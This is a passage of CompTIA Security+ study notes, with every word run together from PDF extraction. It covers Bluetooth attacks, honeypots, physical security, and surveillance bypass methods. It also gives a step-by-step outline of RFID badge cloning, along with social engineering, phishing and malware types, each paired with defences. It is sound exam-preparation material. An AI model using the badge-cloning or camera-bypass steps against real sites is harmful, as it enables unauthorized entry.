+parkinglotorthelobbyofthetargetedorganization■ UnsecureNetworks● Unsecurenetworksincludeswireless,wired,andBluetoothnetworksthat
+
+lacktheappropriatesecuritymeasurestoprotectthesenetworks● Ifwirelessnetworksarenotproperlysecured,unauthorizedindividuals
+
+caninterceptthewirelesscommunicationsorgainaccesstothenetwork● Wirednetworkstendtobemoresecurethantheirwirelessnetworks,but
+
+theyarestillnotimmunetothreats○ Physicalaccesstothenetworkinfrastructurecanleadtovarious
+
+attacks■ MACAddressCloning■ VLANHopping● ByexploitingvulnerabilitiesintheBluetoothprotocol,anattackercan
+
+carryouttheirattacksusingtechniquesliketheBlueBorneorBlueSmack
+
+exploits○ BlueBorne■ SetofvulnerabilitiesinBluetoothtechnologythatcan
+
+allowanattackertotakeoverdevices,spreadmalware,or
+
+evenestablishanon-pathattacktointercept
+
+communicationswithoutanyuserinteraction
+
+29https://www.DionTraining.com
+
+## Page 30
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ BlueSmack■ TypeofDenialofServiceattackthattargets
+
+Bluetooth-enableddevicesbysendingaspeciallycrafted
+
+LogicalLinkControlandAdaptationProtocolpackettoa
+
+targetdevice
+
+● OutsmartingThreatActors○ Oneofthemosteffectivewaystolearnfromthedifferentthreatactorsthatare
+
+attackingyournetworkistosetupandutilizedeceptionanddisruptiontechnologies○ Tactics,Techniques,andProcedures(TTPs)■ Specificmethodsandpatternsofactivitiesorbehaviorsassociatedwitha
+
+particularthreatactororgroupofthreatactors○ DeceptiveandDisruptionTechnologies■ Technologiesdesignedtomislead,confuse,anddivertattackersfromcritical
+
+assetswhilesimultaneouslydetectingandneutralizingthreats■ Honeypots● Decoysystemornetworksetuptoattractpotentialhackers■ Honeynets● Networkofhoneypotstocreateamorecomplexsystemthatisdesigned
+
+tomimicanentirenetworkofsystems○ Servers○ Routers○ Switches■ Honeyfiles● Decoyfileplacedwithinasystemtolureinpotentialattackers
+
+30https://www.DionTraining.com
+
+## Page 31
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Honeytokens● Pieceofdataoraresourcethathasnolegitimatevalueorusebutis
+
+monitoredforaccessoruse○ Somedisruptiontechnologiesandstrategiestohelpsecureourenterprisenetworks■ BogusDNSentries● FakeDomainNameSystementriesintroducedintoyoursystem'sDNS
+
+server■ Creatingdecoydirectories● Fakefoldersandfilesplacedwithinasystem'sstorage■ Dynamicpagegeneration● Effectiveagainstautomatedscrapingtoolsorbotstryingtoindexorsteal
+
+contentfromyourorganization'swebsite■ Useofporttriggeringtohideservices● PortTriggering○ Securitymechanismwherespecificservicesorportsonanetwork
+
+deviceremaincloseduntilaspecificoutboundtrafficpatternis
+
+detected■ Spoofingfaketelemetrydata● Whenasystemdetectsanetworkscanisbeingattemptedbyanattacker,
+
+itcanbeconfiguredtorespondbysendingoutfaketelemetryornetwork
+
+data
+
+31https://www.DionTraining.com
+
+## Page 32
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+PhysicalSecurity
+
+Objectives:● 1.2-Summarizefundamentalsecurityconcepts● 2.4-Analyzeindicatorsofmaliciousactivity
+
+● PhysicalSecurity○ PhysicalSecurity■ Measurestoprotecttangibleassets(buildings,equipment,people)fromharmor
+
+unauthorizedaccess○ SecurityControls■ FencingandBollards● Bollards○ Short,sturdyverticalpostscontrollingorpreventingvehicleaccess● Fences○ Barriersmadeofpostsandwireorboardstoencloseorseparate
+
+areas■ BruteForceAttacks● Forcibleentry● Tamperingwithsecuritydevices● Confrontingsecuritypersonnel● Rammingabarrierwithavehicle■ SurveillanceSystems● Anorganizedstrategytoobserveandreportactivities● Components○ Videosurveillance
+
+32https://www.DionTraining.com
+
+## Page 33
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Securityguards○ Lighting○ Sensors■ AccessControlVestibules● Double-doorsystemelectronicallycontrolledtoallowonlyonedooropen
+
+atatime● Preventspiggybackingandtailgating■ DoorLocks● Padlocks● Pinandtumblerlocks● Numericlocks● Wirelesslocks● Biometriclocks● Cipherlocks● Electronicaccesscontrolsystems■ AccessBadges● UseofRadioFrequencyIdentification(RFID)orNearField
+
+Communication(NFC)foraccess
+
+● FencingandBollards○ Fencingandbollardsstandoutassomeofthemostprimitivetoolsthatareemployedto
+
+safeguardassetsandpeople○ Fence■ Structurethatenclosesanareausinginterconnectedpanelsorposts■ Intermsofphysicalsecurity,fencesserveseveralpurposes● Providesavisualdeterrentbydefiningaboundarythatshouldnotbe
+
+33https://www.DionTraining.com
+
+## Page 34
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+violatedbyunauthorizedpersonnel● Establishaphysicalbarrieragainstunauthorizedentry● Effectivelydelayintruderswhichhelpsprovideoursecuritypersonnela
+
+longerwindowoftimetoreact○ Bollards■ Robust,shortverticalposts,typicallymadeofsteelorconcrete,thatare
+
+designedtomanageorredirectvehiculartraffic○ Fencingisconsideredtobemoreadaptableandwell-suitedforsafeguardinglarge
+
+perimetersaroundtheentirebuilding○ Bollardsarereallydesignedtocountervehicularthreatsinaspecificareainstead
+
+● AttackingwithBruteForce○ BruteForce■ Typeofattackwhereaccesstoasystemisgainedbysimplytryingallofthe
+
+possibilitiesuntilyoubreakthrough○ Intermsofphysicallysecurity,bruteforcefocusesonthefollowing■ ForcibleEntry● Actofgainingunauthorizedaccesstoaspacebyphysicallybreakingor
+
+bypassingitsbarriers,suchaswindows,doors,orfences● Usehigh-strengthdoorswithdeadboltlocks,metalframes,orasolidcore■ Tamperingwithsecuritydevices● Involvesmanipulatingsecuritydevicestocreatenewvulnerabilitiesthat
+
+canbeexploited● Toprotectagainsttamperingwithsecuritydevices,haveredundancyin
+
+physicalsecuritymeasures
+
+34https://www.DionTraining.com
+
+## Page 35
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Confrontingsecuritypersonnel● Involvesthedirectconfrontationorattackofyourorganization'ssecurity
+
+personnel● Securitypersonnelshouldundergorigorousconflictresolutionand
+
+self-defensetrainingtomitigaterisks■ Rammingbarrierswithvehicles● Usesacar, truck,orothermotorizedvehicletoramintothe
+
+- rganization'sphysicalsecuritybarriers,suchasafence,agate,oreven
+thesideofyourbuilding● Installbollardsorreinforcedbarrierstopreventvehiclesfromdrivinginto
+
+yourfacilities
+
+● SurveillanceSystems○ SurveillanceSystem■ Organizedstrategyorsetupdesignedtoobserveandreportactivitiesinagiven
+
+area○ Surveillanceisoftencomprisedoffourmaincategories■ VideoSurveillance● Canincludethefollowing○ Motiondetection○ Nightvision○ Facialrecognition● Remoteaccess● Providesreal-timevisualfeedback● Awiredsolutionsecuritycameraisphysicallycabledfromthedeviceback
+
+tothecentralmonitoringstation
+
+35https://www.DionTraining.com
+
+## Page 36
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● AwirelesssolutionreliesonWi-Fitosenditssignalbacktothecentral
+
+monitoringstation● Pan-Tilt-Zoom(PTZ)System○ Canmovethecameraoritsangletobetterdetectissuesduringan
+
+intrusion● Bestplacestohavecameras○ Datacenter○ Telecommunicationsclosets○ Entranceorexitareas● Camerasshouldbeconfiguredtorecordwhatthey’reobserving■ SecurityGuards● Flexibleandadaptableformsofsurveillancethatorganizationsuse● Helpstoreassureyourstafforyourcustomersthattheyaresafe■ Lighting● Properlightingiscrucialforconductingeffectivesurveillanceusingboth
+
+videoandsecurityguards● Ifyoucreatewell-litareas,thiscandetercriminals,reduceshadowsand
+
+hidingspots,andenhancethequalityofyourvideorecordings■ Sensors● Devicesthatdetectandrespondtoexternalstimuliorchangesinthe
+
+environment● Therearefourcategoriesofsensors○ InfraredSensors■ Detectchangesininfraredradiationthatisoftenemitted
+
+bywarmbodieslikehumansoranimals
+
+36https://www.DionTraining.com
+
+## Page 37
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ PressureSensors■ Activatedwheneveraspecifiedminimumamountof
+
+weightisdetectedonthesensorthatisembeddedintothe
+
+floororamat○ MicrowaveSensors■ Detectmovementinanareabyemittingmicrowavepulses
+
+andmeasuringtheirreflectionoffmovingobjects○ UltrasonicSensors■ Measuresthereflectionofultrasonicwavesoffmoving
+
+- bjects
+● BypassingSurveillanceSystems○ Someofthedifferentmethodsusedbyattackerstobypassyourorganization's
+
+surveillancesystems■ VisualObstruction● Blockingthecamera’slineofsight● Caninvolvethefollowing○ sprayingpaintorfoamontothecameralens○ placingastickerortapeoverthelens○ positioningobjectslikeballoonsorumbrellasinfrontofthe
+
+cameratoblockitsview■ BlindingSensorsandCameras● Involvesoverwhelmingthesensororcamerawithasuddenburstoflight
+
+torenderitineffectiveforalimitedperiodoftime■ InterferingwithAcoustics● Acousticsystemsaredesignedtolistentotheenvironmenttodetectif
+
+37https://www.DionTraining.com
+
+## Page 38
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+someoneisintheareaortoeavesdropontheirconversations● Jammingorplayingloudmusictodisruptthemicrophone’sfunctionality■ InterferingwithElectromagnetic● ElectromagneticInterference(EMI)○ Involvesjammingthesignalsthatsurveillancesystemreliesonto
+
+monitortheenvironment■ AttackingthePhysicalEnvironment● Exploittheenvironmentaroundthesurveillanceequipmentto
+
+compromisetheirfunctionality○ Physicaltampering,likecuttingwiresorphysicallydisablingdevices,isaneffective
+
+strategytobypasssurveillancesystems○ Modernsystemsareequippedwithcountermeasurestohelpprotectsurveillance
+
+systems
+
+● AccessControlVestibules○ AccessControlVestibules■ Double-doorsystemthatisdesignedwithtwodoorsthatareelectronically
+
+controlledtoensurethatonlyonedoorcanbeopenatagiventime○ Theseaccesscontrolvestibulescanalsohelppreventpiggybackingandtailgating■ Piggybacking● Involvestwopeopleworkingtogetherwithonepersonwhohas
+
+legitimateaccessintentionallyallowsanotherpersonwhodoesn'thave
+
+properauthorizationtoenterasecureareawiththem■ Tailgating● Occurswheneveranunauthorizedpersoncloselyfollowssomeone
+
+throughtheaccesscontrolvestibulewhohaslegitimateaccessintothe
+
+38https://www.DionTraining.com
+
+## Page 39
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+securespacewithouttheirknowledgeorconsent■ ThekeydifferencebetweenPiggybackingandTailgating● Piggybackingusessocialengineeringtogainconsentofthepersonwith
+
+legitimateaccess● Tailgatingdoesn’tuseorobtaintheconsentofthepersonwithlegitimate
+
+access.○ Accesscontrolvestibulesareusuallyintegratedwithelectronicbadgesandoperatedby
+
+asecurityguardattheentrancetoasecurefacilityorofficebuilding■ Badgescontain● RFID(Radio-FrequencyIdentification)● NFC(Near-fieldCommunication)● Magneticstrips○ Securityguardsareoftenataccesscontrolvestibulesbecausetheyprovide■ Visualdeterrent■ Assistance■ Checkidentity■ Response
+
+● DoorLocks○ DoorLocks■ Criticalphysicalsecuritycontrolmeasuredesignedtorestrictandregulateaccess
+
+tospecificspacesorproperties,preventingunauthorizedintrusionsand
+
+safeguardingsensitivedataandindividuals○ TypesofDoorLocks■ TraditionalPadlocks● Easilydefeatedandofferminimalprotection
+
+39https://www.DionTraining.com
+
+## Page 40
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ BasicDoorLocks● Vulnerabletosimpletechniqueslikelockpicking■ ModernElectronicDoorLocks● Utilizevariousauthenticationmethodsforenhancedsecurity● AuthenticationMethods○ IdentificationNumbers■ Requireentryofauniquecode,providingabalanceof
+
+securityandconvenience○ WirelessSignals■ UtilizetechnologieslikeNFC,Wi-Fi,Bluetooth,orRFIDfor
+
+unlocking○ Biometrics■ Relyonphysicalcharacteristicslikefingerprints,retinal
+
+scans,orfacialrecognitionforauthentication■ BiometricChallenges● FalseAcceptanceRate(FAR)○ Occurswhenthesystemerroneously
+
+authenticatesanunauthorizeduser○ LowerFARbyincreasingscannersensitivity● FalseRejectionRate(FRR)○ Deniesaccesstoanauthorizeduser.
+
+IncreasingsensitivitycanincreaseFRR● CrossoverErrorRate(CER)○ AbalancebetweenFARandFRRforoptimal
+
+authenticationeffectiveness
+
+40https://www.DionTraining.com
+
+## Page 41
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Someelectronicdoorlocksusemultiplefactors,suchasanidentificationnumberand
+
+fingerprint,toincreasesecurity○ CipherLocks■ Mechanicallockswithnumberedpushbuttons,requiringacorrectcombination
+
+toopen■ Commonlyusedinhigh-securityareaslikeserverrooms○ Secureentryareasinofficebuildings,oftenusingelectronicaccesssystemswithbadges
+
+andPINsforauthentication
+
+● AccessBadgeCloning○ RadioFrequencyIdentification(RFID)andNearFieldCommunication(NFC)arepopular
+
+technologiesusedforcontactlessauthenticationinvariousapplications○ AccessBadgeCloning■ CopyingthedatafromanRFIDorNFCcardorbadgeontoanothercardordevice○ Howdoesanattackercloneanaccessbadge?■ Step1:Scanning● Scanningorreadingthetargetedindividual’saccessbadge■ Step2:DataExtraction● Attackersextracttherelevantauthenticationcredentialsfromthecard,
+
+suchasauniqueidentifierorasetofencrypteddata■ Step3:Writingtoanewcardordevice● AttackerwillthentransferstheextracteddataontoablankRFIDorNFC
+
+cardoranothercompatibledevice■ Step4:Usingtheclonedaccessbadge● Attackersgainunauthorizedaccesstobuildings,computersystems,or
+
+evenmakepaymentsusingaclonedNFC-enabledcreditcard
+
+41https://www.DionTraining.com
+
+## Page 42
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Accessbadgecloningiscommonbecauseofits■ Easeofexecution■ Abilitytobestealthywhenconductingtheattack■ Potentiallywidespreaduseincompromisingphysicalsecurity○ Howcanyoustopaccessbadgecloning?■ Implementadvancedencryptioninyourcard-basedauthenticationsystems■ ImplementMulti-FactorAuthentication(MFA)■ Regularlyupdateyoursecurityprotocols■ Educateyourusers■ ImplementtheuseofshieldedwalletsorsleeveswithyourRFIDaccessbadges
+
+■ Monitorandaudityouraccesslogs
+
+42https://www.DionTraining.com
+
+## Page 43
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+SocialEngineering
+
+Objectives:● 2.2-Explaincommonthreatvectorsandattacksurfaces● 5.6-Givenascenario,youmustbeabletoimplementsecurityawarenesspractices
+
+● SocialEngineering○ SocialEngineering■ Manipulativestrategyexploitinghumanpsychologyforunauthorizedaccessto
+
+systems,data,orphysicalspaces○ MotivationalTriggers■ UsedbySocialEngineers● FamiliarityandLikability● ConsensusandSocialProof● AuthorityandIntimidation● ScarcityandUrgency○ SocialEngineeringTechniques■ Impersonation● Pretendingtobesomeoneelse● Includesbrandimpersonation,typo-squatting,andwateringholeattacks■ Pretexting● Creatingafabricatedscenariotomanipulatetargets● Impersonatingtrustedfigurestogaintrust
+
+43https://www.DionTraining.com
+
+## Page 44
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ TypesofPhishingAttacks■ Phishing■ Vishing■ Smishing■ SpearPhishing■ Whaling■ BusinessEmailCompromise○ FraudsandScams■ Deceptivepracticestodeceivepeopleintopartingwithmoneyorvaluable
+
+information■ Identifyingandtrainingagainstfraudsandscams○ InfluenceCampaigns■ Spreadingmisinformationanddisinformation,impactingpolitics,economics,etc.○ OtherSocialEngineeringAttacks■ DiversionTheft■ Hoaxes■ ShoulderSurfing■ DumpsterDiving■ Eavesdropping■ Baiting■ Piggybacking■ Tailgating
+
+44https://www.DionTraining.com
+
+## Page 45
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● MotivationalTriggers○ Sixmaintypesofmotivationaltriggersthatsocialengineersuse■ Authority● Mostpeoplearewillingtocomplyanddowhatyoutellthemtodoifthey
+
+believeitiscomingfromsomebodywhoisinapositionofauthorityto
+
+makethatrequest■ Urgency● Compellingsenseofimmediacyortime-sensitivitythatdrivesindividuals
+
+toactswiftlyorprioritizecertainactions■ SocialProof● Psychologicalphenomenonwhereindividualslooktothebehaviorsand
+
+actionsofotherstodeterminetheirowndecisionsoractionsinsimilar
+
+situations■ Scarcity● Psychologicalpressurepeoplefeelwhentheybelieveaproduct,
+
+- pportunity,orresourceislimitedorinshortsupply■ Likability● Mostpeoplewanttointeractwithpeopletheylike,andsocialengineers
+realizethis● Canbe○ Sexualattraction○ Pretendingtobeafriend○ Commoninterest■ Fear● Thesetypesofattacksgenerallyarefocusedon"ifyoudon'tdowhatItell
+
+you,thenthisbadthingisgoingtohappentoyou”
+
+45https://www.DionTraining.com
+
+## Page 46
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Impersonation○ Fourmainformsofimpersonationusedbyattackers■ Impersonation● Attackwhereanadversaryassumestheidentityofanotherpersontogain
+
+unauthorizedaccesstoresourcesorstealsensitivedata● Requirestheattackertocollectinformationabouttheorganizationso
+
+thattheycanmoreeasilyearnthetrustoftheirtargetedusers● Attackersprovidedetailstohelpmaketheliesandtheimpersonation
+
+morebelievabletoapotentialvictim● Consequences○ Unauthorizedaccess○ Disruptionofservices○ Completesystemtakeover● Tomitigateagainstthesetypesofattacks,organizationsmustprovide
+
+securityawarenesstrainingtotheiremployeesonaregularbasissothat
+
+theyremainvigilantagainstfutureattacks■ BrandImpersonation● Morespecificformofimpersonationwhereanattackerpretendsto
+
+representalegitimatecompanyorbrand● Attackersusethebrand’slogos,language,andinformationtocreate
+
+deceptivecommunicationsorwebsite● Toprotectagainstbrandimpersonation,organizationsshoulddothe
+
+following○ Educatetheirusersaboutthesetypesofthreats○ Usesecureemailgatewaystofilteroutphishingemails
+
+46https://www.DionTraining.com
+
+## Page 47
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Regularlymonitortheirbrand'sonlinepresencetodetectany
+
+fraudulentactivitiesassoonastheyoccur■ Typosquatting● AlsoknownasURLhijackingorcybersquatting● Formofcyberattackwhereanattackerwillregisteradomainnamethat
+
+issimilartoapopularwebsitebutcontainsomekindofcommon
+
+typographicalerrors● Tocombattyposquatting,organizationswilloftendothefollowing○ Registercommonmisspellingsoftheirowndomainnames○ Useservicesthatmonitorforsimilardomainregistrations○ Conductusersecurityawarenesstrainingtoeducateusersabout
+
+therisksoftyposquatting■ WateringHoleAttacks● Targetedformofcyberattackwhereattackerscompromiseaspecific
+
+websiteorservicethattheirtargetisknowntouse● Thetermisametaphorforanaturallyoccurringphenomenon○ Intheworldofcybersecurity,the"wateringhole"theattacker
+
+choosestoutilizewillusuallybeatrustedwebsiteoronline
+
+service● Tomitigatewateringholeattacks,organizationsshoulddothefollowing○ Keeptheirsystemsandsoftwareupdated○ Usethreatintelligenceservicestostayinformedaboutnew
+
+threats○ Employadvancedmalwaredetectionandpreventiontools
+
+47https://www.DionTraining.com
+
+## Page 48
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Pretexting○ Pretexting■ Givessomeamountofinformationthatseemstruesothatthevictimwillgive
+
+moreinformation○ Mitigationinvolvestrainingtheemployeesnottofallforpretextandnottofillinthe
+
+gapsforpeoplewhentheyarecalling
+
+● PhishingAttacks○ DifferentTypesofPhishingAttacks■ Phishing● Sendingfraudulentemailsthatappeartobefromreputablesourceswith
+
+theaimofconvincingindividualstorevealpersonalinformation,suchas
+
+passwordsandcreditcardnumbers■ SpearPhishing● Moretargetedformofphishingthatisusedbycybercriminalswhoare
+
+moretightlyfocusedonaspecificgroupofindividualsororganizations● Hasahighersuccessrate■ Whaling● Formofspearphishingthattargetshigh-profileindividuals,likeCEOsor
+
+CFOs● Attackerisn'ttryingtocatchthelittlefishinanorganization,butinstead
+
+theywanttocatchoneoftheexecutives,boardmembers,orhigherlevel
+
+managersinthecompanysincetherewardsarepotentiallymuchgreater● Oftenusedasaninitialsteptocompromiseanexecutive’saccountfor
+
+subsequentattackswithintheirorganization
+
+48https://www.DionTraining.com
+
+## Page 49
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ BusinessEmailCompromise(BEC)● Sophisticatedtypeofphishingattackthatusuallytargetsbusinessesby
+
+usingoneoftheirinternalemailaccountstogetotheremployeesto
+
+performsomekindofmaliciousactionsonbehalfoftheattacker● Takingoveralegitimatebusinessemailaccountsthroughsocial
+
+engineeringorcyberintrusiontechniquestoconductunauthorizedfund
+
+transfers,redirectpayments,orstealsensitiveinformation■ Vishing(VoicePhishing)● Attackertrickstheirvictimsintosharingpersonalorfinancialinformation
+
+- verthephone■ Smishing(SMSPhishing)● Involvestheuseoftextmessagestotrickindividualsintoprovidingtheir
+personalinformation
+
+● PreventingPhishingAttacks○ Byimplementingtherightstrategiesandprovidingusersecurityawarenesstraining,the
+
+threatofasuccessfulphishingcampaignagainstyourorganizationcanbemitigated
+
+effectively○ Anti-phishingCampaign■ Essentialusersecurityawarenesstrainingtoolthatcanbeusedtoeducate
+
+individualsabouttherisksofphishingandhowtobestidentifypotentialphishing
+
+attempts■ Shouldofferremedialtrainingforuserswhofellvictimtosimulatedphishing
+
+emails
+
+49https://www.DionTraining.com
+
+## Page 50
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Tohelppreventphishingyourorganizationshouldregularlyconductusersecurity
+
+awarenesstrainingthatcontainscoverageofthevariousphishingtechniques■ Phishing■ SpearPhishing■ Whaling■ BusinessEmailCompromise■ Vishing■ Smishing■ Alongwithotherrelevantcyberthreatsandattacksthatmayaffectyour
+
+- rganization○ Therearesomecommonlyusedkeyindicatorsthatareassociatedwithphishingattacks■ Urgency● Phishingemailsoftencreateasenseofurgencybypromptingthe
+recipienttoactimmediately■ UnusualRequests● Ifyourreceiveanemailrequestingsensitiveinformation,suchas
+
+passwordsorcreditcardnumbers,youshouldtreattheseemailswitha
+
+lotofsuspicion■ MismatchedURLs● WhenyouarelookingatanHTML-basedemail,thewordsyouare
+
+readingarecalledthedisplaytext,buttheunderlyingURLoftheweblink
+
+couldbesettoanythingyouwant● Tocheckifthetext-basedlinkmatchestheunderlyingURL,youshould
+
+alwayshoveryourmouseoverthelinkintheemailforafewsecondsand
+
+thiswillrevealtheactualURLthatthelinkisconnectedto
+
+50https://www.DionTraining.com
+
+## Page 51
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ StrangeEmailAddresses● Iftherealemailaddressandthedisplayedemailaddressdon'tmatch,
+
+thentheemailshouldbetreatedassuspiciousandpossiblypartofa
+
+phishingcampaign■ PoorSpellingorGrammar● Ifanemailhasalotof"brokenEnglish",poorgrammar,ornumerous
+
+spellingerrors,itislikelytobepartofaphishingcampaign○ Mitigation■ Training■ Reportsuspiciousmessagestoprotectyourorganizationfrompotentialphishing
+
+attacks■ Analyzethethreat■ Informallusersaboutthethreat● Ifthephishingemailwasopened,conductaquickinvestigationandtriage
+
+theuser’ssystem■ Anorganizationshouldreviseitssecuritymeasuresforeverysuccessphishing
+
+attack
+
+● FraudsandScams○ Fraud■ Wrongfulorcriminaldeceptionthatisintendedtoresultinfinancialorpersonal
+
+gainfortheattacker■ Oneofthemostcommontypesoffraudthatyouwillseeonlineisknownas
+
+identityfraudoridentitytheft● IdentityFraudandIdentityTheft○ Involvestheuseofanotherperson'spersonalinformationwithout
+
+51https://www.DionTraining.com
+
+## Page 52
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+theirauthorizationtocommitacrimeortodeceiveordefraud
+
+thatotherpersonorsomeotherthirdparty● Differencebetweenidentityfraudandidentitytheft○ Inidentityfraud,theattackertakesthevictim’screditcard
+
+numberandchargesitemstothecard○ Inidentitytheft,theattackertriestofullyassumetheidentityof
+
+theirvictim○ Scams■ Fraudulentordeceptiveactoroperation■ Mostcommonscamiscalledtheinvoicescam● InvoiceScam○ Inwhichapersonistrickedintopayingforafakeinvoicefora
+
+productorservicethattheydidnotactuallyorder
+
+● InfluenceCampaigns○ InfluenceCampaigns■ Coordinatedeffortstoaffectpublicperceptionorbehaviortowardsaparticular
+
+cause,individual,orgroup■ Areapowerfultoolforshapingpublicopinionandbehavior■ Fostermisinformationanddisinformation○ Misinformation■ Falseorinaccurateinformationsharedwithoutharmfulintent○ Disinformation■ Involvesthedeliberatecreationandsharingoffalseinformationwiththeintent
+
+todeceiveormislead○ Remember,misinformationanddisinformationcanhaveseriousconsequencesbecause
+
+52https://www.DionTraining.com
+
+## Page 53
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+theycanunderminepublictrustininstitutions,fuelsocialdivisions,andeveninfluence
+
+theoutcomesofelections
+
+● OtherSocialEngineeringAttacks○ Someofthecommonothersocialengineeringattacks■ DiversionTheft● Involvesmanipulatingasituationorcreatingadistractiontosteal
+
+valuableitemsorinformation■ Hoaxes● Maliciousdeceptionthatisoftenspreadthroughsocialmedia,email,or
+
+- thercommunicationchannels● Oftenpairedwithphishingattacksandimpersonationattacks● Topreventhoaxespeoplemustfactcheckandusegoodcriticalthinking
+skills■ ShoulderSurfing● Involveslookingoversomeone'sshouldertogatherpersonalinformation● Includestheuseofhighpoweredcamerasorclosed-circuittelevision
+
+camerastostealinformationfromadistance● Topreventshouldersurfing,usersmustbeawareoftheirsurroundings
+
+whenprovidinganysensitiveinformation■ DumpsterDiving● Involvessearchingthroughtrashtofindvaluableinformation● Commonlyusedtofinddiscardeddocumentscontainingpersonalor
+
+corporateinformation● Usecleandeskandcleandesktoppolicies
+
+53https://www.DionTraining.com
+
+## Page 54
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Eavesdropping● Involvestheprocessofsecretlylisteningtoprivateconversations● perpetratorinterceptsthecommunicationofpartieswithouttheir
+
+knowledge● Preventthisbyencryptingdataintransit■ Baiting● Involvesleavingamalware-infectedphysicaldevice,likeaUSBdrive,ina
+
+placewhereitwillbefoundbyavictim,whowillthenhopefullyusethe
+
+devicetounknowinglyinstallmalwareontheirorganization'scomputer
+
+system● Topreventbaiting,trainuserstonotusedevicestheyfind■ PiggybackingandTailgating● Involveanunauthorizedpersonfollowinganauthorizedpersonintoa
+
+securearea● Tailgating○ Attackerattemptstofollowanemployeethroughanaccess
+
+controlvestibuleoraccesscontrolpointwithouttheirknowledge● Piggybacking○ Involvesanattackerconvincinganauthorizedemployeetolet
+
+themintothefacilitybygettingtheauthorizedemployeetoswipe
+
+theirownaccessbadgeandallowtheattackerinsidethefacility
+
+54https://www.DionTraining.com
+
+## Page 55
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+Malware
+
+Objective2.4:Givenascenario,analyzeindicatorsofmaliciousactivity
+
+● Malware○ Malware■ Malicioussoftwaredesignedtoinfiltratecomputersystemsandpotentially
+
+damagethemwithoutuserconsent○ Categories■ Viruses■ Worms■ Trojans■ Ransomware■ Spyware■ Rootkits■ Spam○ ThreatVectorvs.AttackVector■ ThreatVector● Methodusedtoinfiltrateavictim'smachine● Examples○ Unpatchedsoftware○ USBdriveinstallation○ Phishingcampaigns■ AttackVector● Meansbywhichtheattackergainsaccessandinfectsthesystem● Combinesbothinfiltrationmethodandinfectionprocess
+
+55https://www.DionTraining.com
+
+## Page 56
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ TypesofMalwareAttacks■ Viruses● Attachtocleanfiles,spread,andcorrupthostfiles■ Worms● Standaloneprogramsreplicatingandspreadingtoothercomputers■ Trojans● Disguiseaslegitimatesoftware,grantunauthorizedaccess■ Ransomware● Encryptsuserdata,demandsransomfordecryption■ ZombiesandBotnets● Compromisedcomputersremotelycontrolledinanetworkformalicious
+
+purposes■ Rootkits● Hidepresenceandactivitiesonacomputer,operateattheOSlevel■ BackdoorsandLogicBombs● Backdoorsallowunauthorizedaccess,logicbombsexecutemalicious
+
+actions■ Keyloggers● Recordkeystrokes,capturepasswordsorsensitiveinformation■ SpywareandBloatware● Spywaremonitorsandgathersuser/systeminformation,bloatware
+
+consumesresourceswithoutvalue○ MalwareTechniquesandInfectionVectors■ Evolvingfromfile-basedtacticstomodernfilelesstechniques■ Multi-stagedeployment,leveragingsystemtools,andobfuscationtechniques
+
+56https://www.DionTraining.com
+
+## Page 57
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ IndicationsofMalwareAttack■ Recognizingsignslikethefollowing● Accountlockouts● Concurrentsessionutilization● Blockedcontent● Impossibletravel● Resourceconsumption● Inaccessibility● Out-of-cyclelogging● Missinglogs● Documentedattacks
+
+● Viruses○ ComputerVirus■ Madeupofmaliciouscodethat'srunonamachinewithouttheuser's
+
+knowledgeandthisallowsthecodetoinfectthecomputerwheneverithasbeen
+
+run○ 10DifferentTypesofViruses■ BootSector● Onethatisstoredinthefirstsectorofaharddriveandisthenloaded
+
+intomemorywheneverthecomputerbootsup■ Macro● Formofcodethatallowsavirustobeembeddedinsideanother
+
+documentsothatwhenthatdocumentisopenedbytheuser,thevirusis
+
+executed
+
+57https://www.DionTraining.com
+
+## Page 58
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Program● Trytofindexecutablesorapplicationfilestoinfectwiththeirmalicious
+
+code■ Multipartite● Combinationofabootsectortypevirusandaprogramvirus● Abletoplaceitselfinthebootsectorandbeloadedeverytimethe
+
+computerboots● Itcaninstallitselfinaprogramwhereitcanberuneverytimethe
+
+computerstartsup■ Encrypted● Designedtohideitselffrombeingdetectedbyencryptingitsmalicious
+
+codeorpayloadstoavoiddetectionbyanyantivirussoftware■ Polymorphic● Advancedversionofanencryptedvirus,butinsteadofjustencryptingthe
+
+contentsitwillactuallychangethevirusescodeeachtimeitisexecuted
+
+byalteringthedecryptionmoduleinorderforittoevadedetection■ Metamorphic● Abletorewritethemselvesentirelybeforeitattemptstoinfectagivenfile■ Stealth● Techniqueusedtopreventthevirusfrombeingdetectedbytheanti-virus
+
+software■ Armored● Havealayerofprotectiontoconfuseaprogramorapersonwho'strying
+
+toanalyzeit■ Hoax● Formoftechnicalsocialengineeringthatattemptstoscareourendusers
+
+58https://www.DionTraining.com
+
+## Page 59
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+intotakingsomekindofundesirableactionontheirsystem
+
+● Worms○ Worm■ Pieceofmalicioussoftware,muchlikeavirus,butitcanreplicateitselfwithout
+
